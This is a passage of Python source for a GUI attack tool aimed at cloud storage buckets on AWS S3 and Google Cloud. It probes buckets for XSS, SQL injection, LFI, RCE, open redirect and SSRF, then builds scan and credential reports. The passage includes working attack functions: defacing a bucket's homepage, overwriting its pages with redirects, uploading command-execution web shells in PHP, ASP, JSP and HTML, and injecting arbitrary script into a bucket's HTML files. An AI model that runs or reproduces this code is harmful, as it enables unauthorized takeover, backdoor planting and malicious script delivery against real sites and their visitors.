                        self.exploit_results_text.insert(tk.END, f"   Bucket '{bucket_name}' exists.\n")
        except dns.resolver.NXDOMAIN:
            self.exploit_results_text.insert(tk.END, f"   No CNAME record found for {domain}\n")
        except Exception as e:
            self.exploit_results_text.insert(tk.END, f"   DNS lookup error: {str(e)}\n")
        
        self.exploit_results_text.insert(tk.END, f"❌ No takeover vulnerability found\n")
    
    def xss_injection(self):
        """Test XSS injection on bucket files"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        self.log(f"Testing XSS on {bucket.name}")
        self.exploit_results_text.insert(tk.END, f"\n💉 Testing XSS injection on {bucket.name}\n")
        self.exploit_results_text.insert(tk.END, "-" * 40 + "\n")
        
        # Find HTML files
        html_files = [f for f in bucket.files if f.name.endswith(('.html', '.htm'))]
        
        if not html_files:
            self.exploit_results_text.insert(tk.END, "No HTML files found to test.\n")
            return
        
        for file_info in html_files[:5]:  # Limit to 5 files
            self.exploit_results_text.insert(tk.END, f"\nTesting: {file_info.path}\n")
            
            if bucket.provider == Provider.AWS_S3:
                url = f"https://{bucket.name}.s3.amazonaws.com/{file_info.path}"
            else:
                url = f"https://storage.googleapis.com/{bucket.name}/{file_info.path}"
            
            # Test with XSS payload
            for payload in self.exploit_payloads['xss'][:3]:
                test_url = f"{url}?test={urllib.parse.quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=self.settings['timeout'])
                    if payload in resp.text:
                        self.exploit_results_text.insert(tk.END, f"   ✅ XSS VULNERABLE with payload: {payload[:30]}...\n")
                        
                        exploit = ExploitResult(
                            bucket_name=bucket.name,
                            exploit_type="XSS",
                            success=True,
                            details=f"XSS vulnerability found in {file_info.path}",
                            proof_url=test_url,
                            payload_used=payload
                        )
                        self.exploit_results.append(exploit)
                        break
                except:
                    pass
    
    def sqli_test(self):
        """Test SQL injection vulnerabilities"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        self.log(f"Testing SQL injection on {bucket.name}")
        self.exploit_results_text.insert(tk.END, f"\n🗄️ Testing SQL injection on {bucket.name}\n")
        self.exploit_results_text.insert(tk.END, "-" * 40 + "\n")
        
        # Find files that might contain parameters
        param_files = [f for f in bucket.files if f.name.endswith(('.php', '.asp', '.aspx', '.jsp', '.html'))]
        
        if not param_files:
            self.exploit_results_text.insert(tk.END, "No parameter-based files found.\n")
            return
        
        for file_info in param_files[:3]:
            self.exploit_results_text.insert(tk.END, f"\nTesting: {file_info.path}\n")
            
            if bucket.provider == Provider.AWS_S3:
                url = f"https://{bucket.name}.s3.amazonaws.com/{file_info.path}"
            else:
                url = f"https://storage.googleapis.com/{bucket.name}/{file_info.path}"
            
            for payload in self.exploit_payloads['sqli'][:3]:
                test_url = f"{url}?id={urllib.parse.quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=self.settings['timeout'])
                    # Check for SQL error messages
                    sql_errors = ['SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL', 'SQLite', 'Microsoft OLE DB']
                    for error in sql_errors:
                        if error.lower() in resp.text.lower():
                            self.exploit_results_text.insert(tk.END, f"   ✅ SQL INJECTION POSSIBLE with payload: {payload}\n")
                            break
                except:
                    pass
    
    def lfi_test(self):
        """Test Local File Inclusion"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        self.log(f"Testing LFI/RFI on {bucket.name}")
        self.exploit_results_text.insert(tk.END, f"\n📁 Testing LFI/RFI on {bucket.name}\n")
        self.exploit_results_text.insert(tk.END, "-" * 40 + "\n")
        
        param_files = [f for f in bucket.files if f.name.endswith(('.php', '.asp', '.aspx', '.jsp'))]
        
        for file_info in param_files[:3]:
            if bucket.provider == Provider.AWS_S3:
                url = f"https://{bucket.name}.s3.amazonaws.com/{file_info.path}"
            else:
                url = f"https://storage.googleapis.com/{bucket.name}/{file_info.path}"
            
            for payload in self.exploit_payloads['lfi'][:3]:
                test_url = f"{url}?page={urllib.parse.quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=self.settings['timeout'])
                    if 'root:x:' in resp.text or 'Windows Registry' in resp.text:
                        self.exploit_results_text.insert(tk.END, f"   ✅ LFI VULNERABLE with payload: {payload}\n")
                        break
                except:
                    pass
    
    def rce_test(self):
        """Test Remote Code Execution"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        self.log(f"Testing RCE on {bucket.name}")
        self.exploit_results_text.insert(tk.END, f"\n⚙️ Testing RCE on {bucket.name}\n")
        self.exploit_results_text.insert(tk.END, "-" * 40 + "\n")
        
        param_files = [f for f in bucket.files if f.name.endswith(('.php', '.asp', '.aspx', '.jsp', '.cgi'))]
        
        for file_info in param_files[:3]:
            if bucket.provider == Provider.AWS_S3:
                url = f"https://{bucket.name}.s3.amazonaws.com/{file_info.path}"
            else:
                url = f"https://storage.googleapis.com/{bucket.name}/{file_info.path}"
            
            for payload in self.exploit_payloads['rce'][:3]:
                test_url = f"{url}?cmd={urllib.parse.quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=self.settings['timeout'])
                    if 'uid=' in resp.text or 'Directory of' in resp.text:
                        self.exploit_results_text.insert(tk.END, f"   ✅ RCE VULNERABLE with payload: {payload}\n")
                        break
                except:
                    pass
    
    def test_open_redirect(self):
        """Test open redirect vulnerability"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        self.log(f"Testing open redirect on {bucket.name}")
        self.exploit_results_text.insert(tk.END, f"\n🔄 Testing open redirect on {bucket.name}\n")
        self.exploit_results_text.insert(tk.END, "-" * 40 + "\n")
        
        redirect_files = [f for f in bucket.files if f.name.endswith(('.php', '.asp', '.aspx', '.jsp', '.html'))]
        
        for file_info in redirect_files[:3]:
            if bucket.provider == Provider.AWS_S3:
                url = f"https://{bucket.name}.s3.amazonaws.com/{file_info.path}"
            else:
                url = f"https://storage.googleapis.com/{bucket.name}/{file_info.path}"
            
            for payload in self.exploit_payloads['open_redirect'][:3]:
                test_url = f"{url}?redirect={urllib.parse.quote(payload)}&url={urllib.parse.quote(payload)}&next={urllib.parse.quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=self.settings['timeout'], allow_redirects=False)
                    if resp.status_code in [301, 302] and 'evil.com' in resp.headers.get('Location', ''):
                        self.exploit_results_text.insert(tk.END, f"   ✅ OPEN REDIRECT VULNERABLE\n")
                        break
                except:
                    pass
    
    def test_ssrf(self):
        """Test Server-Side Request Forgery"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        self.log(f"Testing SSRF on {bucket.name}")
        self.exploit_results_text.insert(tk.END, f"\n🔗 Testing SSRF on {bucket.name}\n")
        self.exploit_results_text.insert(tk.END, "-" * 40 + "\n")
        
        param_files = [f for f in bucket.files if f.name.endswith(('.php', '.asp', '.aspx', '.jsp'))]
        
        for file_info in param_files[:3]:
            if bucket.provider == Provider.AWS_S3:
                url = f"https://{bucket.name}.s3.amazonaws.com/{file_info.path}"
            else:
                url = f"https://storage.googleapis.com/{bucket.name}/{file_info.path}"
            
            for payload in self.exploit_payloads['ssrf'][:3]:
                test_url = f"{url}?url={urllib.parse.quote(payload)}&path={urllib.parse.quote(payload)}&file={urllib.parse.quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=self.settings['timeout'])
                    if 'instance-id' in resp.text or 'local-ipv4' in resp.text or 'project-id' in resp.text:
                        self.exploit_results_text.insert(tk.END, f"   ✅ SSRF VULNERABLE - Metadata exposed!\n")
                        break
                except:
                    pass
    
    def deface_homepage(self):
        """Deface bucket homepage"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        if not messagebox.askyesno("Warning", "This will modify the bucket's homepage. Continue?"):
            return
        
        self.log(f"Defacing homepage on {bucket.name}")
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Security Test - {bucket.name}</title>
    <style>
        body {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            background: rgba(0,0,0,0.8);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 600px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }}
        h1 {{
            color: #ff4444;
            font-size: 48px;
            margin-bottom: 20px;
        }}
        .message {{
            color: #00ff00;
            font-size: 18px;
            margin: 20px 0;
        }}
        .bucket {{
            color: #ffaa00;
            font-size: 24px;
            margin: 20px 0;
        }}
        .time {{
            color: #888;
            font-size: 14px;
            margin-top: 30px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Security Test</h1>
        <div class="message">This bucket has public write access enabled!</div>
        <div class="bucket">Bucket: {bucket.name}</div>
        <div class="message">This is a security test performed on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
        <div class="time">This file was created during authorized security testing</div>
    </div>
</body>
</html>'''
        
        if bucket.provider == Provider.AWS_S3:
            url = f"https://{bucket.name}.s3.amazonaws.com/index.html"
        else:
            url = f"https://storage.googleapis.com/{bucket.name}/index.html"
        
        try:
            resp = self.session.put(url, data=html.encode('utf-8'), headers={'Content-Type': 'text/html'})
            if resp.status_code == 200:
                self.exploit_results_text.insert(tk.END, f"✅ Homepage defaced successfully!\n")
                self.exploit_results_text.insert(tk.END, f"   URL: {url}\n")
                webbrowser.open(url)
            else:
                self.exploit_results_text.insert(tk.END, f"❌ Defacement failed: {resp.status_code}\n")
        except Exception as e:
            self.exploit_results_text.insert(tk.END, f"❌ Error: {str(e)}\n")
    
    def redirect_all_pages(self):
        """Redirect all pages to a different URL"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        redirect_url = simpledialog.askstring("Redirect URL", "Enter redirect URL:", initialvalue="https://example.com")
        if not redirect_url:
            return
        
        if not messagebox.askyesno("Warning", f"Redirect all pages to {redirect_url}? Continue?"):
            return
        
        self.log(f"Setting up redirect on {bucket.name}")
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url={redirect_url}">
    <script>window.location.href = "{redirect_url}";</script>
</head>
<body>
    Redirecting to <a href="{redirect_url}">{redirect_url}</a>...
</body>
</html>'''
        
        pages = ['index.html', 'default.html', 'index.htm', 'default.htm']
        
        for page in pages:
            if bucket.provider == Provider.AWS_S3:
                url = f"https://{bucket.name}.s3.amazonaws.com/{page}"
            else:
                url = f"https://storage.googleapis.com/{bucket.name}/{page}"
            
            try:
                resp = self.session.put(url, data=html.encode('utf-8'), headers={'Content-Type': 'text/html'})
                if resp.status_code == 200:
                    self.exploit_results_text.insert(tk.END, f"✅ Redirect set for {page}\n")
            except:
                pass
        
        self.exploit_results_text.insert(tk.END, f"\n✅ Redirect configured for {redirect_url}\n")
    
    def create_backdoor(self):
        """Create backdoor file in bucket"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        backdoor_type = simpledialog.askstring("Backdoor Type", "Enter backdoor type (php, asp, jsp, html):", initialvalue="php")
        if not backdoor_type:
            return
        
        backdoor_name = simpledialog.askstring("Backdoor Name", "Enter backdoor filename:", initialvalue=f"backdoor.{backdoor_type}")
        if not backdoor_name:
            return
        
        self.log(f"Creating backdoor on {bucket.name}: {backdoor_name}")
        
        backdoors = {
            'php': '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
}
?>''',
            'asp': '''<%
If Request("cmd") <> "" Then
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd.exe /c " & Request("cmd"), 0, True
End If
%>''',
            'jsp': '''<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null){
        out.println(line);
    }
}
%>''',
            'html': '''<script>
function execute(cmd){
    fetch(window.location.pathname + '?cmd=' + encodeURIComponent(cmd))
        .then(r => r.text())
        .then(t => document.getElementById('output').innerHTML = '<pre>' + t + '</pre>');
}
</script>
<input type="text" id="cmd" placeholder="Enter command">
<button onclick="execute(document.getElementById('cmd').value)">Execute</button>
<div id="output"></div>'''
        }
        
        code = backdoors.get(backdoor_type, backdoors['php'])
        
        if bucket.provider == Provider.AWS_S3:
            url = f"https://{bucket.name}.s3.amazonaws.com/{backdoor_name}"
        else:
            url = f"https://storage.googleapis.com/{bucket.name}/{backdoor_name}"
        
        try:
            resp = self.session.put(url, data=code.encode('utf-8'), 
                                   headers={'Content-Type': 'text/html' if backdoor_type == 'html' else 'application/x-httpd-php'})
            if resp.status_code == 200:
                self.exploit_results_text.insert(tk.END, f"✅ Backdoor created successfully!\n")
                self.exploit_results_text.insert(tk.END, f"   URL: {url}\n")
                webbrowser.open(url)
            else:
                self.exploit_results_text.insert(tk.END, f"❌ Backdoor creation failed: {resp.status_code}\n")
        except Exception as e:
            self.exploit_results_text.insert(tk.END, f"❌ Error: {str(e)}\n")
    
    def execute_custom_payload(self):
        """Execute custom payload on bucket"""
        bucket = self.get_selected_bucket_from_tree()
        if not bucket:
            return
        
        payload = self.custom_payload_var.get()
        if not payload:
            messagebox.showwarning("Warning", "Enter a payload!")
            return
        
        self.log(f"Executing custom payload on {bucket.name}")
        self.exploit_results_text.insert(tk.END, f"\n💀 Executing custom payload on {bucket.name}\n")
        self.exploit_results_text.insert(tk.END, "-" * 40 + "\n")
        self.exploit_results_text.insert(tk.END, f"Payload: {payload}\n\n")
        
        # Find a file to inject into
        html_files = [f for f in bucket.files if f.name.endswith(('.html', '.htm'))]
        
        if not html_files:
            # Create a test file
            test_file = f"test_{int(time.time())}.html"
            if bucket.provider == Provider.AWS_S3:
                url = f"https://{bucket.name}.s3.amazonaws.com/{test_file}"
            else:
                url = f"https://storage.googleapis.com/{bucket.name}/{test_file}"
            
            html_content = f'''<!DOCTYPE html>
<html>
<head><title>Test Page</title></head>
<body>
<h1>Test Page</h1>
<p>This is a test page for security testing.</p>
</body>
</html>'''
            
            self.session.put(url, data=html_content.encode('utf-8'), headers={'Content-Type': 'text/html'})
            target_file = test_file
        else:
            target_file = html_files[0].path
        
        self.exploit_results_text.insert(tk.END, f"Target file: {target_file}\n")
        
        # Inject payload
        if bucket.provider == Provider.AWS_S3:
            url = f"https://{bucket.name}.s3.amazonaws.com/{target_file}"
        else:
            url = f"https://storage.googleapis.com/{bucket.name}/{target_file}"
        
        try:
            # Get current content
            resp = self.session.get(url)
            if resp.status_code == 200:
                content = resp.text
                # Inject payload
                if '</body>' in content:
                    new_content = content.replace('</body>', f'<script>{payload}</script></body>')
                else:
                    new_content = content + f'<script>{payload}</script>'
                
                # Upload modified content
                put_resp = self.session.put(url, data=new_content.encode('utf-8'), headers={'Content-Type': 'text/html'})
                if put_resp.status_code == 200:
                    self.exploit_results_text.insert(tk.END, f"✅ Payload injected successfully!\n")
                    self.exploit_results_text.insert(tk.END, f"   URL: {url}\n")
                    webbrowser.open(url)
                else:
                    self.exploit_results_text.insert(tk.END, f"❌ Injection failed: {put_resp.status_code}\n")
            else:
                self.exploit_results_text.insert(tk.END, f"❌ Cannot read target file: {resp.status_code}\n")
        except Exception as e:
            self.exploit_results_text.insert(tk.END, f"❌ Error: {str(e)}\n")
    
    # ========================================================================
    # VULNERABILITY SCANNING
    # ========================================================================
    
    def scan_vulnerabilities(self):
        """Scan all buckets for vulnerabilities"""
        self.log("Starting vulnerability scan...")

        # Reset dedup cache for each full scan run
        self._vuln_seen = set()

        # Work on a snapshot to avoid concurrent list mutation issues
        buckets_snapshot = list(self.buckets)
        for bucket in buckets_snapshot:
            self.scan_bucket_vulnerabilities(bucket)

        self.log("Vulnerability scan completed")
        messagebox.showinfo("Scan Complete", "Vulnerability scan completed. Check the Vulnerabilities tab.")
    
    def scan_bucket_vulnerabilities(self, bucket: BucketInfo):
        """Scan a single bucket for vulnerabilities"""
        # Check public read
        if bucket.is_public_read:
            self.add_vulnerability(
                bucket.name,
                "Public Read Access",
                "High",
                f"Bucket allows public read access. Anyone can list and download files.",
                "Enable private access or use signed URLs"
            )
        
        # Check public write
        if bucket.is_public_write:
            self.add_vulnerability(
                bucket.name,
                "Public Write Access",
                "Critical",
                f"Bucket allows public write access. Anyone can upload, modify, or delete files.",
                "Remove public write permissions immediately"
            )
        
        # Check for sensitive files
        for file_info in bucket.files:
            if file_info.file_type == FileType.ENV:
                self.add_vulnerability(
                    bucket.name,
                    "Environment File Exposure",
                    "High",
                    f"Environment file exposed: {file_info.path}",
                    "Remove sensitive files from public bucket"
                )
            elif file_info.file_type == FileType.KEY:
                self.add_vulnerability(
                    bucket.name,
                    "Private Key Exposure",
                    "Critical",
                    f"Private key file exposed: {file_info.path}",
                    "Remove private keys from public bucket immediately"
                )
            elif file_info.file_type == FileType.BACKUP:
                self.add_vulnerability(
                    bucket.name,
                    "Backup File Exposure",
                    "Medium",
                    f"Backup file exposed: {file_info.path}",
                    "Remove backup files or secure them"
                )
            elif file_info.file_type == FileType.DATABASE:
                self.add_vulnerability(
                    bucket.name,
                    "Database File Exposure",
                    "High",
                    f"Database file exposed: {file_info.path}",
                    "Remove database files from public bucket"
                )
        
        # Check for website hosting
        if bucket.website_enabled:
            self.add_vulnerability(
                bucket.name,
                "Static Website Hosting",
                "Medium",
                f"Bucket hosts a static website at {bucket.website_endpoint}",
                "Review website content for sensitive data"
            )
        
        # Check for logging
        if not bucket.logging_enabled:
            self.add_vulnerability(
                bucket.name,
                "Logging Disabled",
                "Low",
                "Bucket access logging is not enabled",
                "Enable access logging for audit purposes"
            )
        
        # Check for versioning
        if not bucket.versioning_enabled:
            self.add_vulnerability(
                bucket.name,
                "Versioning Disabled",
                "Low",
                "Bucket versioning is not enabled",
                "Enable versioning to protect against accidental deletions"
            )
        
        # Check for encryption
        if not bucket.encryption_enabled:
            self.add_vulnerability(
                bucket.name,
                "Encryption Disabled",
                "Medium",
                "Server-side encryption is not enabled",
                "Enable encryption for data at rest"
            )
    
    def add_vulnerability(self, bucket_name: str, vuln_type: str, severity: str, details: str, remediation: str):
        """Add vulnerability to display and database (deduplicated for stability)."""
        # Deduplicate in memory to avoid UI flooding/freezes
        if not hasattr(self, '_vuln_seen'):
            self._vuln_seen = set()

        vuln_key = (bucket_name, vuln_type, details)
        if vuln_key in self._vuln_seen:
            return
        self._vuln_seen.add(vuln_key)

        # Determine tag for severity
        severity_lower = severity.lower()
        tag = severity_lower

        # Insert into tree
        if hasattr(self, 'vuln_tree'):
            self.vuln_tree.insert('', 0, values=(
                bucket_name,
                vuln_type,
                severity,
                details,
                datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ), tags=(tag,))

        # Save to database (thread-safe cursor usage)
        with self.db_lock:
            cur = self.conn.cursor()
            cur.execute('''
                INSERT INTO exploits (bucket_name, exploit_type, success, details, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (bucket_name, vuln_type, True, details, datetime.now().isoformat()))
            self.conn.commit()

        self.log(f"Vulnerability found: {vuln_type} in {bucket_name} ({severity})")
    
    # ========================================================================
    # REPORT GENERATION
    # ========================================================================
    
    def generate_full_report(self, filename: str = None):
        """Generate comprehensive HTML report"""
        if not filename:
            filename = filedialog.asksaveasfilename(
                defaultextension=".html",
                filetypes=[("HTML", "*.html"), ("All Files", "*.*")]
            )
        
        if not filename:
            return
        
        total_buckets = len(self.buckets)
        total_files = sum(b.total_files for b in self.buckets)
        total_size = sum(b.total_size for b in self.buckets)
        public_buckets = sum(1 for b in self.buckets if b.is_public_read)
        writable_buckets = sum(1 for b in self.buckets if b.is_public_write)
        total_creds = len(self.cred_tree.get_children()) if hasattr(self, 'cred_tree') else 0
        
        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{self.APP_NAME} - Security Assessment Report</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            padding: 20px;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
        }}
        
        .header {{
            text-align: center;
            padding: 40px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            margin-bottom: 30px;
        }}
        
        .header h1 {{
            font-size: 48px;
            margin-bottom: 10px;
            background: linear-gradient(135deg, #00ff00, #00ccff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        
        .header .version {{
            color: #888;
            margin-bottom: 20px;
        }}
        
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        
        .stat-card {{
            background: rgba(255, 255, 255, 0.1);
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            backdrop-filter: blur(10px);
            transition: transform 0.3s;
        }}
        
        .stat-card:hover {{
            transform: translateY(-5px);
        }}
        
        .stat-number {{
            font-size: 36px;
            font-weight: bold;
            color: #00ff00;
        }}
        
        .stat-label {{
            font-size: 14px;
            color: #aaa;
            margin-top: 10px;
        }}
        
        .section {{
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
        }}
        
        .section h2 {{
            margin-bottom: 20px;
            color: #00ccff;
            border-bottom: 2px solid #00ccff;
            padding-bottom: 10px;
        }}
        
        table {{
            width: 100%;
            border-collapse: collapse;
        }}
        
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }}
        
        th {{
            background: rgba(0, 204, 255, 0.2);
            color: #00ccff;
            font-weight: bold;
        }}
        
        tr:hover {{
            background: rgba(255, 255, 255, 0.05);
        }}
        
        .badge {{
            display: inline-block;
            padding: 3px 8px;
            border-radius: 5px;
            font-size: 11px;
            font-weight: bold;
        }}
        
        .badge-critical {{
            background: #8B0000;
            color: white;
        }}
        
        .badge-high {{
            background: #FF4444;
            color: white;
        }}
        
        .badge-medium {{
            background: #FFAA00;
            color: black;
        }}
        
        .badge-low {{
            background: #4488FF;
            color: white;
        }}
        
        .risk-critical {{ color: #ff4444; }}
        .risk-high {{ color: #ffaa00; }}
        .risk-medium {{ color: #ffff00; }}
        .risk-low {{ color: #00ff00; }}
        
        .footer {{
            text-align: center;
            padding: 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            margin-top: 30px;
        }}
        
        @media print {{
            body {{
                background: white;
                color: black;
            }}
            .stat-card {{
                background: #f0f0f0;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 {self.APP_NAME}</h1>
            <div class="version">Version {self.VERSION} | Security Assessment Report</div>
            <div>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{total_buckets}</div>
                <div class="stat-label">Total Buckets</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{total_files:,}</div>
                <div class="stat-label">Total Files</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.format_size(total_size)}</div>
                <div class="stat-label">Total Size</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{public_buckets}</div>
                <div class="stat-label">Public Buckets</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{writable_buckets}</div>
                <div class="stat-label">Writable Buckets</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{total_creds}</div>
                <div class="stat-label">Credentials Found</div>
            </div>
        </div>
        
        <div class="section">
            <h2>📦 Discovered Buckets</h2>
            <table>
                <thead>
                    <tr>
                        <th>Bucket Name</th>
                        <th>Provider</th>
                        <th>Region</th>
                        <th>Files</th>
                        <th>Size</th>
                        <th>Public Read</th>
                        <th>Public Write</th>
                        <th>Risk Score</th>
                    </tr>
                </thead>
                <tbody>
'''
        
        for bucket in self.buckets:
            risk_class = f"risk-{bucket.risk_level.lower()}"
            html += f'''
                    <tr>
                        <td><strong>{bucket.name}</strong></td>
                        <td>{bucket.provider.value}</td>
                        <td>{bucket.region}</td>
                        <td>{bucket.total_files:,}</td>
                        <td>{self.format_size(bucket.total_size)}</td>
                        <td>{'✅ Yes' if bucket.is_public_read else '❌ No'}</td>
                        <td>{'⚠️ Yes' if bucket.is_public_write else '❌ No'}</td>
                        <td class="{risk_class}">{bucket.risk_score}</td>
                    </tr>
'''
        
        html += '''
                </tbody>
            </table>
        </div>
        
        <div class="section">
            <h2>🔑 Credentials Found</h2>
            <table>
                <thead>
                    <tr>
                        <th>Bucket</th>
                        <th>File</th>
                        <th>Type</th>
                        <th>Value</th>
                        <th>Severity</th>
                    </tr>
                </thead>
                <tbody>
'''
        
        if hasattr(self, 'cred_tree'):
            for item in self.cred_tree.get_children():
                values = self.cred_tree.item(item)['values']
                severity = values[4].lower()
                html += f'''
                    <tr>
                        <td>{values[0]}</td>
                        <td>{values[1]}</td>
                        <td>{values[2]}</td>
                        <td><code>{values[3][:100]}</code></td>
                        <td><span class="badge badge-{severity}">{values[4]}</span></td>
                    </tr>
'''
        
        html += '''
                </tbody>
            </table>
        </div>
        
        <div class="section">
            <h2>⚠️ Vulnerabilities Found</h2>
            <table>
                <thead>
                    <tr>
                        <th>Bucket</th>
                        <th>Vulnerability</th>
                        <th>Severity</th>
                        <th>Details</th>
                    </tr>
                </thead>
                <tbody>
'''
        
        if hasattr(self, 'vuln_tree'):
            for item in self.vuln_tree.get_children():
                values = self.vuln_tree.item(item)['values']
                severity = values[2].lower()
                html += f'''
                    <tr>
                        <td>{values[0]}</td>
                        <td>{values[1]}</td>
                        <td><span class="badge badge-{severity}">{values[2]}</span></td>
                        <td>{values[3]}</td>
                    </tr>
'''
        
        html += f'''
                </tbody>
            </table>
        </div>
        
        <div class="footer">
            <p>Report generated by {self.APP_NAME} v{self.VERSION}</p>
            <p style="color: #ffaa00; margin-top: 10px;">⚠️ This report is for authorized security testing only ⚠️</p>
            <p style="color: #888; margin-top: 10px;">© {datetime.now().year} Cloud Storage Hunter - Professional Security Assessment Tool</p>
        </div>
    </div>
</body>
</html>
'''
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        
        self.log(f"Report saved: {filename}")
        webbrowser.open(f'file://{os.path.abspath(filename)}')
        messagebox.showinfo("Report Generated", f"Report saved to:\n{filename}")
        
        return filename
    
    def generate_pdf_report(self):
        """Generate PDF report (requires reportlab)"""
        try:
            from reportlab.lib import colors
            from reportlab.lib.pagesizes import letter, landscape
            from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, Image
            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
            from reportlab.lib.units import inch
            
            filename = filedialog.asksaveasfilename(defaultextension=".pdf", filetypes=[("PDF", "*.pdf")])
            if not filename:
                return
            
            doc = SimpleDocTemplate(filename, pagesize=landscape(letter))
            styles = getSampleStyleSheet()
            story = []
            
            # Title
            title_style = ParagraphStyle('CustomTitle', parent=styles['Heading1'], fontSize=24, textColor=colors.green)
            story.append(Paragraph(f"{self.APP_NAME} v{self.VERSION}", title_style))
            story.append(Spacer(1, 0.2*inch))
            story.append(Paragraph(f"Security Assessment Report", styles['Heading2']))
            story.append(Spacer(1, 0.2*inch))
            story.append(Paragraph(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
            story.append(Spacer(1, 0.3*inch))
            
            # Summary table
            data = [['Metric', 'Value']]
            data.append(['Total Buckets', str(len(self.buckets))])
            data.append(['Total Files', str(sum(b.total_files for b in self.buckets))])
            data.append(['Total Size', self.format_size(sum(b.total_size for b in self.buckets))])
            data.append(['Public Buckets', str(sum(1 for b in self.buckets if b.is_public_read))])
            data.append(['Writable Buckets', str(sum(1 for b in self.buckets if b.is_public_write))])
            
            table = Table(data)
            table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 14),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black),
            ]))
            story.append(table)
            
            doc.build(story)
            self.log(f"PDF report saved: {filename}")
            webbrowser.open(filename)
            messagebox.showinfo("Report Generated", f"PDF report saved to:\n{filename}")
            
        except ImportError:
            messagebox.showerror("Error", "ReportLab not installed. Please install: pip install reportlab")
    
    def generate_executive_summary(self):
        """Generate executive summary report"""
        total_buckets = len(self.buckets)
        total_files = sum(b.total_files for b in self.buckets)
        public_buckets = sum(1 for b in self.buckets if b.is_public_read)
        writable_buckets = sum(1 for b in self.buckets if b.is_public_write)
        critical_vulns = len([v for v in self.vuln_tree.get_children() if 'Critical' in str(self.vuln_tree.item(v)['values'][2])]) if hasattr(self, 'vuln_tree') else 0
        
        summary = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         EXECUTIVE SECURITY SUMMARY                            ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  Assessment Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}              ║
║  Tool Version: {self.APP_NAME} v{self.VERSION}                                 ║
║                                                                               ║
